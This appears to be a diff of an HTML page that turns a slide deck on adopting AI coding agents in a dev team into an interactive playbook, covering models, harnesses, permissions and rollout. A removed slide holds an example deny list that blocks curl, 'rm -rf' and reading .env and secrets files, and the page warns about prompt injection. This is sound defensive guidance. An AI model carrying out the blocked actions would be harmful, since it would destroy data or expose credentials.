@@ -1,386 +1,841 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Getting Started with AI in a Dev Team</title>
+  <title>AI.DEV // Getting Started with AI in a Dev Team</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+  <!-- Top Reading Progress -->
+  <div class="scroll-progress" aria-hidden="true">
+    <div class="scroll-progress__bar" id="scrollProgress"></div>
+  </div>
 
-  <main class="deck" id="deck">
+  <!-- Ambient Tech Grid Background -->
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="bg-glow bg-glow--1" aria-hidden="true"></div>
+  <div class="bg-glow bg-glow--2" aria-hidden="true"></div>
 
-    <!-- 1 Title -->
-    <section class="slide title-slide">
-      <p class="kicker">Team session</p>
-      <h1 class="display">Getting Started with AI in a Dev Team</h1>
-      <p class="lead">Harnesses, models, skills, agents, permissions, and how we start safely.</p>
-    </section>
+  <!-- Sticky Navigation -->
+  <header class="site-header" id="siteHeader">
+    <div class="container header-inner">
+      <a href="#hero" class="brand">
+        <span class="brand-dot"></span>
+        <span class="brand-text">AI.DEV<span class="brand-slash"> // </span>PLAYBOOK</span>
+      </a>
 
-    <!-- 2 Agenda -->
-    <section class="slide">
-      <p class="kicker">Overview</p>
-      <h2>Agenda</h2>
-      <ol class="agenda">
-        <li>Harness and models</li>
-        <li>Best models: quality vs price</li>
-        <li>Local vs cloud models</li>
-      <li>Balanced workflow: when to use each</li>
-      <li>Local vs cloud models</li>
-      <li>Balanced workflow: when to use each</li>
-      <li>Skills, tasks, agents, setup</li
-        <li>Popular harnesses</li>
-        <li>Permissions and security</li>
-        <li>Before we start: team ground rules</li>
-        <li>4-week rollout and next steps</li>
-      </ol>
-    </section>
+      <nav class="main-nav" aria-label="Primary navigation">
+        <a href="#foundations" class="nav-link">Foundations</a>
+        <a href="#models" class="nav-link">Models</a>
+        <a href="#concepts" class="nav-link">Concepts</a>
+        <a href="#harnesses" class="nav-link">Harnesses</a>
+        <a href="#setup-examples" class="nav-link nav-link--highlight">Setup Lab</a>
+        <a href="#security" class="nav-link">Security</a>
+        <a href="#rollout" class="nav-link">Rollout</a>
+      </nav>
 
-    <!-- 3 Harness vs model -->
-    <section class="slide">
-      <p class="kicker">1 · Foundations</p>
-      <h2>What is a harness? What is a model?</h2>
-      <div class="flow">
-        <div class="node">You</div><span class="arrow">→</span>
-        <div class="node">Harness<small>runtime, tools, permissions</small></div><span class="arrow">→</span>
-        <div class="node">Model<small>generates text and code</small></div><span class="arrow">→</span>
-        <div class="node">Tools<small>files, shell, git, web</small></div><span class="arrow">→</span>
-        <div class="node">Our repo</div>
+      <div class="header-actions">
+        <button class="icon-btn" id="themeToggle" aria-label="Toggle light or dark theme" title="Toggle theme">
+          <span class="theme-icon" id="themeIcon">☀</span>
+        </button>
+        <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Toggle navigation menu" aria-expanded="false">
+          ☰
+        </button>
       </div>
-      <ul>
-        <li><strong>Model:</strong> decides how good the answer is (Claude, GPT, Gemini, DeepSeek, Qwen…)</li>
-        <li><strong>Harness:</strong> decides what the agent can touch and how safely it works</li>
-      </ul>
-    </section>
+    </div>
+  </header>
 
-    <!-- 4 Models table -->
-    <section class="slide">
-      <p class="kicker">2 · Models</p>
-      <h2>Popular models: quality vs price</h2>
-      <table>
-        <thead><tr><th>Family</th><th>Strength</th><th>Relative cost</th><th>Good for</th></tr></thead>
-        <tbody>
-          <tr><td>Claude Opus</td><td>Top reasoning, large refactors</td><td>High</td><td>Architecture, hard bugs, planning</td></tr>
-          <tr><td>Claude Sonnet</td><td>Best quality per dollar for code</td><td>Medium</td><td>Daily feature work, reviews</td></tr>
-          <tr><td>Claude Haiku</td><td>Fast and cheap</td><td>Low</td><td>Small edits, subagent tasks</td></tr>
-          <tr><td>GPT-5 family</td><td>Strong general and coding; mini tiers</td><td>Medium to low</td><td>Broad use, cost-sensitive jobs</td></tr>
-          <tr><td>Gemini Pro / Flash</td><td>Very large context, good value</td><td>Medium to low</td><td>Big codebases and docs</td></tr>
-          <tr><td>DeepSeek</td><td>Open weights, very low price</td><td>Very low</td><td>Bulk work, budget, self-hosting</td></tr>
-          <tr><td>Qwen3-Coder / Kimi K2</td><td>Strong open coding models</td><td>Very low</td><td>Privacy-sensitive setups</td></tr>
-        </tbody>
-      </table>
-      <p class="note">Prices and rankings change often. Verify on provider sites before budgeting.</p>
-    </section>
+  <main>
+    <!-- HERO SECTION -->
+    <section id="hero" class="hero section">
+      <div class="container hero-grid">
+        <div class="hero-content reveal">
+          <div class="badge-pill">
+            <span class="pulse-dot"></span>
+            TEAM ENGINEERING PLAYBOOK · INTERACTIVE EDITION
+          </div>
+          <h1 class="hero-title">
+            Getting Started with <span class="gradient-text">AI Agents</span> in a Dev Team
+          </h1>
+          <p class="hero-lead">
+            A practical, high-tech field guide to harnesses, model routing, reusable skills, subagents, permissions, and safe team adoption.
+          </p>
+          <div class="hero-cta">
+            <a href="#setup-examples" class="btn btn-primary">
+              <span>Explore Harness Setup Lab</span>
+              <span class="btn-arrow">→</span>
+            </a>
+            <a href="#foundations" class="btn btn-secondary">
+              <span>Start Curriculum</span>
+            </a>
+          </div>
+          <div class="hero-metrics">
+            <div class="metric">
+              <span class="metric-val">3</span>
+              <span class="metric-label">Harnesses Covered<br><small>Claude · OpenCode · Pi</small></span>
+            </div>
+            <div class="metric">
+              <span class="metric-val">7</span>
+              <span class="metric-label">Core Modules<br><small>Interactive Labs</small></span>
+            </div>
+            <div class="metric">
+              <span class="metric-val">4-Wk</span>
+              <span class="metric-label">Safe Rollout<br><small>Pilot to Production</small></span>
+            </div>
+          </div>
+        </div>
 
-    <!-- 5 Model strategy -->
-    <section class="slide">
-      <p class="kicker">2 · Models</p>
-      <h2>Model strategy: pick by task, not by hype</h2>
-      <div class="cards">
-        <article class="card"><span class="tag">Expensive</span><h3>Best quality</h3><p>Top Opus or GPT-5 class. Planning, architecture, tricky debugging.</p></article>
-        <article class="card"><span class="tag">Default</span><h3>Best value</h3><p>Sonnet, GPT-5 mid tier, Gemini Pro. Most daily coding happens here.</p></article>
-        <article class="card"><span class="tag">Bulk</span><h3>Cheap and fast</h3><p>Haiku, mini, Flash, DeepSeek. Search, tests, boilerplate, subagents.</p></article>
+        <!-- Animated Hero Terminal Preview -->
+        <div class="hero-visual reveal" style="--delay: 120ms">
+          <div class="terminal-window hero-terminal">
+            <div class="terminal-bar">
+              <div class="terminal-dots">
+                <span></span><span></span><span></span>
+              </div>
+              <span class="terminal-title">agent-session — ~/repo</span>
+              <span class="terminal-status">READY</span>
+            </div>
+            <div class="terminal-body" id="heroTerminalBody">
+              <div class="term-line"><span class="prompt">$</span> <span class="typed-cmd" id="heroTypedCmd"></span><span class="cursor-blink">▋</span></div>
+              <div class="term-output" id="heroTermOutput"></div>
+            </div>
+          </div>
+        </div>
       </div>
-      <p class="note">Mix models: strong model to plan and review, cheap model to execute repetitive steps.</p>
-    </section>
 
-    <!-- 5b Local vs cloud -->
-    <section class="slide">
-      <p class="kicker">2 · Models</p>
-      <h2>Local models vs cloud models</h2>
-      <div class="cards grid-2">
-        <article class="card">
-          <span class="tag">Local / self-hosted</span>
-          <h3>Run on your own machine</h3>
-          <p>Open-weight models (DeepSeek, Qwen, Kimi, Llama) served via Ollama, vLLM, or a private server.</p>
-          <ul>
-            <li>Zero data leaves the machine</li>
-            <li>No per-token billing</li>
-            <li>Slower, less capable than top cloud models</li>
-            <li>Needs hardware and maintenance</li>
-          </ul>
-        </article>
-        <article class="card">
-          <span class="tag">Cloud / API</span>
-          <h3>Provider runs the model</h3>
-          <p>Claude, GPT, Gemini, and others via API or managed plans.</p>
-          <ul>
-            <li>Best quality and fastest improvement</li>
-            <li>Pay per use; cost scales with usage</li>
-            <li>Code may leave your network</li>
-            <li>Check retention and training terms</li>
-          </ul>
-        </article>
-      </div>
-      <p class="note">Local is for privacy and cost at scale. Cloud is for quality and speed. We use both.</p>
-    </section>
-
-    <!-- 5c Balanced workflow -->
-    <section class="slide">
-      <p class="kicker">2 · Models</p>
-      <h2>Balanced workflow: when to use each</h2>
-      <div class="cards grid-2">
-        <article class="card">
-          <h3>Local first</h3>
-          <p>Chat sessions, questions, and small edits.</p>
-          <ul>
-            <li>Quick questions and brainstorming</li>
-            <li>Explaining existing code</li>
-            <li>Boilerplate and scaffolding</li>
-            <li>Anything with no secrets and no need for top quality</li>
-          </ul>
-        </article>
-        <article class="card">
-          <h3>Cloud first</h3>
-          <p>Hard work that needs the strongest model.</p>
-          <ul>
-            <li>Planning architecture and large refactors</li>
-            <li>Tricky bugs and security-sensitive logic</li>
-            <li>Reviewing PRs and writing tests</li>
-            <li>Anything where the answer must be right</li>
-          </ul>
-        </article>
-      </div>
-      <p class="note">Rule of thumb: local for speed and privacy, cloud for quality. Escalate when the task gets hard or sensitive.</p>
-    </section>
-
-    <!-- 6 Concepts -->
-    <section class="slide">
-      <p class="kicker">3 · Concepts</p>
-      <h2>Task, skill, agent, and project memory</h2>
-      <div class="cards grid-2">
-        <article class="card"><h3>Task</h3><p>One bounded unit of work with a clear definition of done. Small tasks succeed more often.</p></article>
-        <article class="card"><h3>Skill</h3><p>Reusable instructions (SKILL.md): how we write migrations, run E2E tests, and so on.</p></article>
-        <article class="card"><h3>Agent (subagent)</h3><p>Separate context with its own role, tools, and model. E.g. a read-only reviewer.</p></article>
-        <article class="card"><h3>AGENTS.md</h3><p>Project memory: commands, conventions, folder layout, and do-not rules. Read at every session start.</p></article>
+      <!-- Curriculum Overview Strip -->
+      <div class="container reveal" style="--delay: 200ms">
+        <div class="curriculum-strip">
+          <a href="#foundations" class="curr-item"><span class="curr-num">01</span><span>Harness &amp; Models</span></a>
+          <a href="#models" class="curr-item"><span class="curr-num">02</span><span>Quality vs Price &amp; Local</span></a>
+          <a href="#concepts" class="curr-item"><span class="curr-num">03</span><span>Skills, Agents &amp; Loop</span></a>
+          <a href="#harnesses" class="curr-item"><span class="curr-num">04</span><span>Popular Harnesses</span></a>
+          <a href="#setup-examples" class="curr-item curr-item--accent"><span class="curr-num">05</span><span>Setup Lab: Claude / OpenCode / Pi</span></a>
+          <a href="#security" class="curr-item"><span class="curr-num">06</span><span>Permissions &amp; Security</span></a>
+          <a href="#rollout" class="curr-item"><span class="curr-num">07</span><span>Ground Rules &amp; Rollout</span></a>
+        </div>
       </div>
     </section>
 
-    <!-- 7 Dev loop -->
-    <section class="slide">
-      <p class="kicker">3 · Concepts</p>
-      <h2>The basic AI-assisted development loop</h2>
-      <div class="flow">
-        <div class="node">Write task</div><span class="arrow">→</span>
-        <div class="node">Plan<small>strong model</small></div><span class="arrow">→</span>
-        <div class="node">Implement<small>on a branch</small></div><span class="arrow">→</span>
-        <div class="node">Run tests<small>and lint</small></div><span class="arrow">→</span>
-        <div class="node">Review<small>agent + human</small></div><span class="arrow">→</span>
-        <div class="node">Pull request</div>
-      </div>
-      <ul>
-        <li>Every AI change goes through a branch, tests, and human review</li>
-        <li>Same CI and same definition of done as human-written code</li>
-      </ul>
-    </section>
+    <!-- 01. FOUNDATIONS -->
+    <section id="foundations" class="section">
+      <div class="container">
+        <div class="section-header reveal">
+          <span class="kicker">01 · Foundations</span>
+          <h2>What is a harness? What is a model?</h2>
+          <p class="section-sub">Click any layer in the pipeline below to inspect how your prompt travels safely to your repository.</p>
+        </div>
 
-    <!-- 8 Starter setup -->
-    <section class="slide">
-      <p class="kicker">3 · Concepts</p>
-      <h2>Minimal starter setup</h2>
-      <ol class="steps">
-        <li>Pick one harness and one default model for the team</li>
-        <li>Add AGENTS.md to each repo: stack, commands, style rules, forbidden paths</li>
-        <li>Create 2 to 3 skills for your most repeated tasks</li>
-        <li>Add a read-only reviewer agent for pull requests</li>
-        <li>Require branch + tests + human review for every AI change</li>
-      </ol>
-    </section>
+        <!-- Interactive Architecture Pipeline -->
+        <div class="interactive-panel reveal">
+          <div class="pipeline-controls">
+            <button class="btn btn-sm btn-primary" id="animatePipelineBtn">▶ Trace Request Flow</button>
+            <span class="pipeline-hint">or click any node to inspect</span>
+          </div>
 
-    <!-- 9 Repo layout -->
-    <section class="slide">
-      <p class="kicker">3 · Concepts</p>
-      <h2>Example repo layout</h2>
-<pre><code>repo/
-├── AGENTS.md                  # project memory: commands + conventions
-├── .ai/
-│   ├── skills/
-│   │   ├── create-endpoint/SKILL.md
-│   │   └── write-tests/SKILL.md
-│   └── agents/
-│       └── reviewer.md        # read-only review role
-└── .ai-permissions.json       # allow / deny rules</code></pre>
-      <p class="note">Commit shared config to git. Keep personal overrides and secrets out of it.</p>
-    </section>
+          <div class="flow-pipeline" id="archPipeline" role="tablist" aria-label="Agent architecture layers">
+            <button class="flow-node active" data-layer="you" role="tab" aria-selected="true">
+              <span class="node-badge">INPUT</span>
+              <strong>You</strong>
+              <small>Intent &amp; task</small>
+            </button>
+            <div class="flow-connector"><span class="packet"></span>→</div>
 
-    <!-- 10 Harnesses -->
-    <section class="slide">
-      <p class="kicker">4 · Harnesses</p>
-      <h2>Popular harnesses</h2>
-      <div class="cards">
-        <article class="card"><span class="tag">Closed source</span><h3>Claude Code</h3><p>Anthropic's terminal and IDE agent. Strong permissions, hooks, subagents, skills. Easiest start if we use Claude.</p></article>
-        <article class="card"><span class="tag">Open source</span><h3>OpenCode</h3><p>Terminal agent (MIT). Many providers, including local and open-weight models. Good for avoiding lock-in.</p></article>
-        <article class="card"><span class="tag">Open source</span><h3>Pi</h3><p>Minimal, extensible terminal agent built around skills, extensions, prompt templates, and subagents.</p></article>
-      </div>
-    </section>
+            <button class="flow-node" data-layer="harness" role="tab" aria-selected="false">
+              <span class="node-badge">RUNTIME</span>
+              <strong>Harness</strong>
+              <small>tools, memory, rules</small>
+            </button>
+            <div class="flow-connector"><span class="packet"></span>→</div>
 
-    <!-- 11 Harness comparison -->
-    <section class="slide">
-      <p class="kicker">4 · Harnesses</p>
-      <h2>Harness comparison</h2>
-      <table>
-        <thead><tr><th></th><th>Claude Code</th><th>OpenCode</th><th>Pi</th></tr></thead>
-        <tbody>
-          <tr><td>Open source</td><td>No</td><td>Yes</td><td>Yes</td></tr>
-          <tr><td>Model choice</td><td>Mainly Claude</td><td>Many providers</td><td>Many providers</td></tr>
-          <tr><td>Permission controls</td><td>Strong, built in</td><td>Built in</td><td>Via extensions and settings</td></tr>
-          <tr><td>Skills and subagents</td><td>Yes</td><td>Yes</td><td>Yes</td></tr>
-          <tr><td>Learning curve</td><td>Low</td><td>Low to medium</td><td>Medium</td></tr>
-          <tr><td>Best for</td><td>Polished Claude workflow</td><td>Provider freedom</td><td>Customizable minimal workflow</td></tr>
-        </tbody>
-      </table>
-      <p class="note">Recommendation: choose one primary tool to avoid fragmentation.</p>
-    </section>
+            <button class="flow-node" data-layer="model" role="tab" aria-selected="false">
+              <span class="node-badge">BRAIN</span>
+              <strong>Model</strong>
+              <small>reasoning &amp; code</small>
+            </button>
+            <div class="flow-connector"><span class="packet"></span>→</div>
 
-    <!-- 12 Permission levels -->
-    <section class="slide">
-      <p class="kicker">5 · Security</p>
-      <h2>Permission levels</h2>
-      <table>
-        <thead><tr><th>Level</th><th>Agent can</th><th>Use for</th></tr></thead>
-        <tbody>
-          <tr><td>Read-only</td><td>Read and search code</td><td>Reviews, research, questions</td></tr>
-          <tr><td>Supervised edit</td><td>Edit files; approve each shell command</td><td>Default for most work</td></tr>
-          <tr><td>Scoped auto</td><td>Edit + whitelisted commands (test, lint)</td><td>Routine tasks in a sandbox</td></tr>
-          <tr><td>Full auto</td><td>Anything</td><td>Disposable sandboxes only, never real credentials</td></tr>
-        </tbody>
-      </table>
-      <p class="note">Start at Supervised edit. Move up only with evidence.</p>
-    </section>
+            <button class="flow-node" data-layer="tools" role="tab" aria-selected="false">
+              <span class="node-badge">HANDS</span>
+              <strong>Tools</strong>
+              <small>files, shell, git, web</small>
+            </button>
+            <div class="flow-connector"><span class="packet"></span>→</div>
 
-    <!-- 13 Example policy -->
-    <section class="slide">
-      <p class="kicker">5 · Security</p>
-      <h2>Example deny-by-default policy</h2>
-<pre><code>{
-  "allow": [
-    "Bash(npm test)", "Bash(npm run lint)",
-    "Bash(git status)", "Bash(git diff)",
-    "Read(./src/**)", "Edit(./src/**)"
-  ],
-  "deny": [
-    "Read(./.env*)", "Read(./secrets/**)",
-    "Bash(curl *)", "Bash(rm -rf *)",
-    "Bash(git push *)", "Edit(./infra/prod/**)"
-  ]
-}</code></pre>
-      <p class="note">Illustrative. Map to the real format of our chosen harness.</p>
-    </section>
+            <button class="flow-node" data-layer="repo" role="tab" aria-selected="false">
+              <span class="node-badge">TARGET</span>
+              <strong>Our Repo</strong>
+              <small>branch, tests, PR</small>
+            </button>
+          </div>
 
-    <!-- 14 Threats -->
-    <section class="slide">
-      <p class="kicker">5 · Security</p>
-      <h2>Threats to know</h2>
-      <dl class="threats">
-        <dt>Prompt injection</dt><dd>Instructions hidden in issues, docs, web pages, or dependencies can steer the agent.</dd>
-        <dt>Malicious plugins / MCP servers</dt><dd>Vet every tool, skill, and extension like a dependency; pin versions.</dd>
-        <dt>Hallucinated packages</dt><dd>Verify every new dependency exists and is maintained.</dd>
-        <dt>Silent weakening</dt><dd>Agents may disable tests to pass. Protect test and CI config with code owners.</dd>
-      </dl>
-    </section>
+          <div class="layer-inspector" id="layerInspector">
+            <!-- Populated by JS -->
+          </div>
+        </div>
 
-    <!-- 15 Secrets -->
-    <section class="slide">
-      <p class="kicker">5 · Security</p>
-      <h2>Secrets and data handling</h2>
-      <ul>
-        <li>Keep .env files, keys, and tokens out of the agent's readable paths</li>
-        <li>Use short-lived, scoped tokens. Never give production or cloud admin credentials</li>
-        <li>Check provider data retention and training terms; prefer enterprise plans</li>
-        <li>Run a secret scanner (e.g. gitleaks) in pre-commit and CI</li>
-        <li>Restrict network egress from agent sandboxes to allow-listed hosts</li>
-      </ul>
-    </section>
-
-    <!-- 16 Safe path -->
-    <section class="slide">
-      <p class="kicker">5 · Security</p>
-      <h2>Safe-path checklist</h2>
-      <ul class="checklist">
-        <li>Agent works in a branch or worktree, never on main</li>
-        <li>Deny rules cover secrets, prod infra, and git push</li>
-        <li>Pre-commit: secret scan, lint, tests</li>
-        <li>CI: required checks and code-owner approval on sensitive paths</li>
-        <li>Session and command logs kept for audit where supported</li>
-        <li>Written team policy: what data may enter prompts, and what must never</li>
-      </ul>
-    </section>
-
-    <!-- 17 Before you start 1/2 -->
-    <section class="slide">
-      <p class="kicker">6 · Before we start</p>
-      <h2>Before you start (1/2): policy and people</h2>
-      <dl class="threats">
-        <dt>Acceptable use policy</dt><dd>Classify data: public, internal, confidential, personal or regulated. Define what may go into prompts.</dd>
-        <dt>Approved tools and models</dt><dd>Vendor review: data residency, GDPR, retention, and contract terms.</dd>
-        <dt>Ownership</dt><dd>The developer who opens the PR owns the code. AI is never the author of record.</dd>
-        <dt>Licensing and IP</dt><dd>Check dependency licenses and generated code similarity; involve legal where needed.</dd>
-      </dl>
-    </section>
-
-    <!-- 18 Before you start 2/2 -->
-    <section class="slide">
-      <p class="kicker">6 · Before we start</p>
-      <h2>Before you start (2/2): process and measurement</h2>
-      <dl class="threats">
-        <dt>Baseline metrics now</dt><dd>Cycle time, review rounds, escaped defects, and effort per task, so we can prove impact.</dd>
-        <dt>Low-risk pilot repo</dt><dd>Good test coverage, clear ownership, no critical production path.</dd>
-        <dt>Cost guardrails</dt><dd>Per-user budgets, usage dashboards, and alerts from day one.</dd>
-        <dt>Incident process</dt><dd>If a secret or customer data leaks into a prompt: rotate, notify security, record the event.</dd>
-        <dt>Opt-in culture</dt><dd>No pressure to adopt. Share what works in a team log; review AGENTS.md in retros.</dd>
-      </dl>
-    </section>
-
-    <!-- 19 Where to be careful -->
-    <section class="slide">
-      <p class="kicker">6 · Before we start</p>
-      <h2>Where to be extra careful</h2>
-      <div class="cards grid-2">
-        <article class="card"><h3>Needs senior review</h3><p>Authentication, authorization, cryptography, payments, and data-deletion logic.</p></article>
-        <article class="card"><h3>Avoid unsupervised</h3><p>Production hotfixes, infrastructure changes, and migrations on real data.</p></article>
-        <article class="card"><h3>Good early wins</h3><p>Unit tests, docs, refactors with tests, boilerplate, and code explanations.</p></article>
-        <article class="card"><h3>Common anti-patterns</h3><p>Merging code nobody read, "fixing" failing tests by weakening them, skipping review.</p></article>
+        <div class="cards grid-2 mt-lg reveal">
+          <article class="card glass-card">
+            <span class="tag">Model</span>
+            <h3>Decides intelligence &amp; code quality</h3>
+            <p>Claude, GPT, Gemini, DeepSeek, Qwen. The model reasons over context, plans changes, and generates text, patches, and tool calls.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag">Harness</span>
+            <h3>Decides safety, context &amp; capabilities</h3>
+            <p>Claude Code, OpenCode, Pi. The harness loads <code>AGENTS.md</code>, enforces allow/deny permissions, executes tools, and manages subagents.</p>
+          </article>
+        </div>
       </div>
     </section>
 
-    <!-- 20 Rollout -->
-    <section class="slide">
-      <p class="kicker">7 · Next steps</p>
-      <h2>4-week rollout</h2>
-      <table>
-        <thead><tr><th>Week</th><th>Goal</th><th>Done when</th></tr></thead>
-        <tbody>
-          <tr><td>1</td><td>Pilot with 2 to 3 devs on one repo</td><td>AGENTS.md written, tools installed, permissions set</td></tr>
-          <tr><td>2</td><td>Build first skills and a reviewer agent</td><td>3 repeated tasks automated with skills</td></tr>
-          <tr><td>3</td><td>Expand to the team; add CI guardrails</td><td>All AI PRs pass secret scan, tests, and review</td></tr>
-          <tr><td>4</td><td>Measure and decide</td><td>Time saved, defects, cost per PR; set the default</td></tr>
-        </tbody>
-      </table>
-      <p class="note">Measure: cycle time, review comments per PR, escaped bugs, monthly spend per developer.</p>
+    <!-- 02. MODELS -->
+    <section id="models" class="section section-alt">
+      <div class="container">
+        <div class="section-header reveal">
+          <span class="kicker">02 · Models &amp; Routing</span>
+          <h2>Popular models: quality vs. price</h2>
+          <p class="section-sub">Pick models by task complexity and privacy needs, not by hype. Filter the matrix below.</p>
+        </div>
+
+        <!-- Filterable Model Matrix -->
+        <div class="interactive-panel reveal">
+          <div class="filter-bar" role="group" aria-label="Filter models by tier">
+            <button class="filter-btn active" data-filter="all">All Models</button>
+            <button class="filter-btn" data-filter="high">Flagship (Planning)</button>
+            <button class="filter-btn" data-filter="medium">Balanced (Daily)</button>
+            <button class="filter-btn" data-filter="low">Fast &amp; Open (Bulk / Local)</button>
+          </div>
+
+          <div class="table-wrap">
+            <table class="data-table" id="modelsTable">
+              <thead>
+                <tr>
+                  <th>Family</th>
+                  <th>Strength</th>
+                  <th>Relative Cost</th>
+                  <th>Good For</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr data-tier="high">
+                  <td>Claude Opus</td>
+                  <td>Top reasoning, large refactors</td>
+                  <td><span class="cost-pill cost-high">High</span></td>
+                  <td>Architecture, hard bugs, planning</td>
+                </tr>
+                <tr data-tier="medium">
+                  <td>Claude Sonnet</td>
+                  <td>Best quality per dollar for code</td>
+                  <td><span class="cost-pill cost-med">Medium</span></td>
+                  <td>Daily feature work, reviews</td>
+                </tr>
+                <tr data-tier="low">
+                  <td>Claude Haiku</td>
+                  <td>Fast and cheap</td>
+                  <td><span class="cost-pill cost-low">Low</span></td>
+                  <td>Small edits, subagent tasks</td>
+                </tr>
+                <tr data-tier="medium">
+                  <td>GPT-5 family</td>
+                  <td>Strong general and coding; mini tiers</td>
+                  <td><span class="cost-pill cost-med">Med – Low</span></td>
+                  <td>Broad use, cost-sensitive jobs</td>
+                </tr>
+                <tr data-tier="medium">
+                  <td>Gemini Pro / Flash</td>
+                  <td>Very large context, good value</td>
+                  <td><span class="cost-pill cost-med">Med – Low</span></td>
+                  <td>Big codebases and docs</td>
+                </tr>
+                <tr data-tier="low">
+                  <td>DeepSeek</td>
+                  <td>Open weights, very low price</td>
+                  <td><span class="cost-pill cost-vlow">Very Low</span></td>
+                  <td>Bulk work, budget, self-hosting</td>
+                </tr>
+                <tr data-tier="low">
+                  <td>Qwen3-Coder / Kimi K2</td>
+                  <td>Strong open coding models</td>
+                  <td><span class="cost-pill cost-vlow">Very Low</span></td>
+                  <td>Privacy-sensitive &amp; local setups</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p class="note mt-sm">Prices and rankings change often. Verify on provider sites before budgeting.</p>
+        </div>
+
+        <!-- Model Strategy 3 Tiers -->
+        <div class="cards grid-3 mt-lg reveal">
+          <article class="card glass-card">
+            <span class="tag tag-amber">Expensive</span>
+            <h3>Best quality</h3>
+            <p>Top Opus or GPT-5 class. Planning, architecture, tricky debugging.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-cyan">Default</span>
+            <h3>Best value</h3>
+            <p>Sonnet, GPT-5 mid tier, Gemini Pro. Most daily coding happens here.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-green">Bulk</span>
+            <h3>Cheap &amp; fast</h3>
+            <p>Haiku, mini, Flash, DeepSeek. Search, tests, boilerplate, subagents.</p>
+          </article>
+        </div>
+
+        <!-- Local vs Cloud -->
+        <div class="cards grid-2 mt-lg reveal">
+          <article class="card glass-card">
+            <span class="tag tag-green">Local / Self-hosted</span>
+            <h3>Run on your own machine</h3>
+            <p>Open-weight models (DeepSeek, Qwen, Kimi, Llama) served via Ollama, vLLM, or a private server.</p>
+            <ul class="clean-list mt-sm">
+              <li>Zero data leaves the machine</li>
+              <li>No per-token billing</li>
+              <li>Slower, less capable than top cloud models</li>
+              <li>Needs hardware and maintenance</li>
+            </ul>
+          </article>
+          <article class="card glass-card">
+            <span class="tag tag-cyan">Cloud / API</span>
+            <h3>Provider runs the model</h3>
+            <p>Claude, GPT, Gemini, and others via API or managed enterprise plans.</p>
+            <ul class="clean-list mt-sm">
+              <li>Best quality and fastest improvement</li>
+              <li>Pay per use; cost scales with usage</li>
+              <li>Code may leave your network</li>
+              <li>Check retention and training terms</li>
+            </ul>
+          </article>
+        </div>
+
+        <!-- Interactive Task Router -->
+        <div class="interactive-panel mt-lg reveal">
+          <div class="panel-head">
+            <div>
+              <span class="kicker">Interactive Simulator</span>
+              <h3>Balanced Workflow Router: Local vs. Cloud</h3>
+            </div>
+            <p class="muted">Select a real engineering task to see the recommended model tier and routing rationale.</p>
+          </div>
+          <div class="router-grid">
+            <div class="router-tasks" id="routerTasks">
+              <button class="router-task active" data-route="explain">Explain legacy regex &amp; utils</button>
+              <button class="router-task" data-route="arch">Refactor auth middleware across 12 files</button>
+              <button class="router-task" data-route="scaffold">Generate DTO boilerplate &amp; types</button>
+              <button class="router-task" data-route="race">Debug intermittent race condition</button>
+              <button class="router-task" data-route="review">Security &amp; logic PR review</button>
+            </div>
+            <div class="router-result" id="routerResult">
+              <!-- Populated by JS -->
+            </div>
+          </div>
+        </div>
+      </div>
     </section>
 
-    <!-- 21 Closing -->
-    <section class="slide">
-      <p class="kicker">Next steps</p>
-      <h2 class="display">Let's start</h2>
-      <ul>
-        <li>Agree on the acceptable use policy and approved tools this week</li>
-        <li>Choose the pilot repo and the 2 to 3 pilot developers</li>
-        <li>Capture baseline metrics before the first AI task</li>
-        <li>Questions and discussion</li>
-      </ul>
+    <!-- 03. CONCEPTS & DEV LOOP -->
+    <section id="concepts" class="section">
+      <div class="container">
+        <div class="section-header reveal">
+          <span class="kicker">03 · Core Concepts</span>
+          <h2>Task, skill, agent, and project memory</h2>
+          <p class="section-sub">The four building blocks that make AI agents predictable across a team.</p>
+        </div>
+
+        <div class="cards grid-2 reveal">
+          <article class="card glass-card">
+            <span class="tag">01 · Unit of Work</span>
+            <h3>Task</h3>
+            <p>One bounded unit of work with a clear definition of done. Small, focused tasks succeed far more often than vague mega-prompts.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag">02 · Playbook</span>
+            <h3>Skill (<code>SKILL.md</code>)</h3>
+            <p>Reusable instructions: how we write database migrations, create API endpoints, or run E2E tests consistently.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag">03 · Isolated Context</span>
+            <h3>Agent (Subagent)</h3>
+            <p>Separate context window with its own role, restricted tools, and model. Example: a read-only PR reviewer.</p>
+          </article>
+          <article class="card glass-card">
+            <span class="tag">04 · Shared Brain</span>
+            <h3><code>AGENTS.md</code></h3>
+            <p>Project memory: build/test commands, conventions, folder layout, and do-not rules. Read automatically at every session start.</p>
+          </article>
+        </div>
+
+        <!-- Animated Dev Loop -->
+        <div class="interactive-panel mt-lg reveal">
+          <div class="panel-head">
+            <div>
+              <span class="kicker">Interactive Pipeline</span>
+              <h3>The AI-Assisted Development Loop</h3>
+            </div>
+            <button class="btn btn-sm btn-primary" id="playDevLoopBtn">▶ Simulate Loop</button>
+          </div>
+          <div class="dev-loop" id="devLoop">
+            <div class="loop-step active" data-step="0">
+              <span class="loop-num">01</span>
+              <strong>Write Task</strong>
+              <small>Bounded scope</small>
+            </div>
+            <div class="loop-step" data-step="1">
+              <span class="loop-num">02</span>
+              <strong>Plan</strong>
+              <small>Strong model</small>
+            </div>
+            <div class="loop-step" data-step="2">
+              <span class="loop-num">03</span>
+              <strong>Implement</strong>
+              <small>On a branch</small>
+            </div>
+            <div class="loop-step" data-step="3">
+              <span class="loop-num">04</span>
+              <strong>Run Tests</strong>
+              <small>Tests + lint</small>
+            </div>
+            <div class="loop-step" data-step="4">
+              <span class="loop-num">05</span>
+              <strong>Review</strong>
